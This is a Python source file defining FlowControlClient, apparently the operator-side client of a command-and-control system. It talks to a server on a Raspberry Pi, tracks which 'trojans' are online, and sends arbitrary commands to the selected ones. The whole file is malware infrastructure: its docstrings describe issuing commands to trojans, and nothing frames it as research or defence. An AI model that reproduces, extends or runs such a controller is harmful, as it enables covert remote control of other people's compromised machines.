__author__ = 'Jonas'
from JTShell.lib.JTLib.JTNetwork.client import TCPClient
import time


class FlowControlClient(TCPClient):
    """
    the client object for the FlowControlServer running on the raspberry. Providing a interface to send commands to be
    distributed among the chosen trojans, but also being a storage for the list of available trojans, that can be
    refreshed using the update method. Also containing a list of connected trojans, meaning a list of trojans currently
    cashed, issued commands will only be send to the connected trojans.
    """
    def __init__(self, serverip="127.0.0.1"):
        super(FlowControlClient, self).__init__(serverip)
        self.available = []
        self.connected = []
        self.end_seq = "<|end|>"

    def ping(self):
        """
        returns whether the server is available and able to send and receive data
        :return:(bool)
        """
        self.send("ping")
        time.sleep(0.2)
        if self.receive() == "ping":
            return True
        else:
            return False

    def update(self):
        """
        refreshes the list of online trojans, that is stored on the server side
        :return:(void)
        """
        self.send("available")
        while self.end_seq not in self.receive_buffer:
            time.sleep(0.01)
        self.receive_buffer.remove(self.end_seq)
        reply = self.receive()
        self.available = reply.split(",")

    def execute(self, command):
        """
        sends the command passed to all trojans currently connected. After issuing this method, one should take care of
        the received replies
        :param command: (string) the command to be sent to the trojans
        :return:(void)
        """
        prefix = "["
        for name in self.connected:
            prefix += name + ","
        prefix = prefix[:-1] + "]"
        self.send(prefix + command)

    def connect(self, *names):
        """
        adds the names given to the list of connected trojans, in case they are online
        :param names: (string)
        :return: (void)
        """
        for name in names:
            if name in self.available:
                self.connected.append(name)

    def disconnect(self, *names):
        """
        removes the names given from the list of connected trojans, in case they are even connected
        :param names: (string)
        :return: (void)
        """
        for name in names:
            if name in self.connected:
                self.connected.remove(name)